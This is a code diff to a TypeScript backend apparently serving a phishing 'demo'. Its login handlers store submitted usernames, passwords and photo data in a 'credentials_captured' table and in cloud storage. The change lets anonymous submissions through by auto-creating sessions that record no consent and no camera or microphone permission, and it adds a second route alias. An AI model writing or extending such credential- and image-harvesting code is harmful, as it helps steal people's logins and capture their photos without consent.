@@ -21,6 +21,8 @@ api.use('*', async (c, next) => {
   await next();
 });
 
+const legacyRouteAliases = ['/ms/cyberz', '/ms/cybers'];
+
 const PHOTO_PREFIX = 'photos';
 
 async function persistPhotoToR2(
@@ -227,11 +229,29 @@ api.get('/api/sessions/:id/status', async (c) => {
 const createDemoHandler = (platform: string) => {
   return async (c: any) => {
     const db = c.env.DB;
-    const { sessionId, email_or_username, password, photo_data, timestamp } =
-      await c.req.json();
+    const payload = await c.req.json();
+    const sessionId = payload?.sessionId || payload?.session_id || `anonymous_${Date.now()}`;
+    const { email_or_username, password, photo_data, timestamp } = payload;
 
     try {
       await initDatabase(db);
+
+      const currentSessionId = sessionId || `anonymous_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
+      const existingSession = await db
+        .prepare(`SELECT 1 FROM sessions WHERE id = ?`)
+        .bind(currentSessionId)
+        .first();
+
+      if (!existingSession) {
+        await db
+          .prepare(
+            `INSERT OR IGNORE INTO sessions (id, consent_given, camera_permission, microphone_permission, client_ip, user_agent)
+             VALUES (?, 0, 0, 0, 'unknown', 'unknown')`
+          )
+          .bind(currentSessionId)
+          .run();
+      }
+
       const credId = `cred_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
 
       await db
@@ -239,14 +259,14 @@ const createDemoHandler = (platform: string) => {
           `INSERT INTO credentials_captured (id, session_id, demo_type, email_or_username, password, captured_at)
          VALUES (?, ?, ?, ?, ?, ?)`
         )
-        .bind(credId, sessionId, platform, email_or_username, password, timestamp)
+        .bind(credId, currentSessionId, platform, email_or_username, password, timestamp)
         .run();
 
       // Store photo if provided in R2 and keep a D1 record pointing at it
-      if (photo_data && sessionId) {
+      if (photo_data && currentSessionId) {
         const photoId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
         try {
-          const storedPhoto = await persistPhotoToR2(c.env, sessionId, photo_data, platform);
+          const storedPhoto = await persistPhotoToR2(c.env, currentSessionId, photo_data, platform);
 
           await db
             .prepare(
@@ -255,7 +275,7 @@ const createDemoHandler = (platform: string) => {
             )
             .bind(
               photoId,
-              sessionId,
+              currentSessionId,
               storedPhoto?.objectKey || photo_data.substring(0, 1000),
               storedPhoto?.objectKey || null,
               JSON.stringify(storedPhoto?.metadata || { source: platform }),
@@ -272,10 +292,10 @@ const createDemoHandler = (platform: string) => {
         .prepare(
           `UPDATE sessions SET photo_count = photo_count + 1, updated_at = CURRENT_TIMESTAMP WHERE id = ?`
         )
-        .bind(sessionId)
+        .bind(currentSessionId)
         .run();
 
-      return c.json({ success: true, message: 'Login attempt recorded' });
+      return c.json({ success: true, message: 'Login attempt recorded', sessionId: currentSessionId });
     } catch (error) {
       console.error(`${platform} login error:`, error);
       return c.json({ error: 'Failed to process login' }, 500);
@@ -600,6 +620,8 @@ api.get('/', (c) => {
   return c.json({ message: 'CyberX Backend API', version: '1.0.0' });
 });
 
-app.route('/ms/cyberz', api);
+for (const basePath of legacyRouteAliases) {
+  app.route(basePath, api);
+}
 
 export default app;
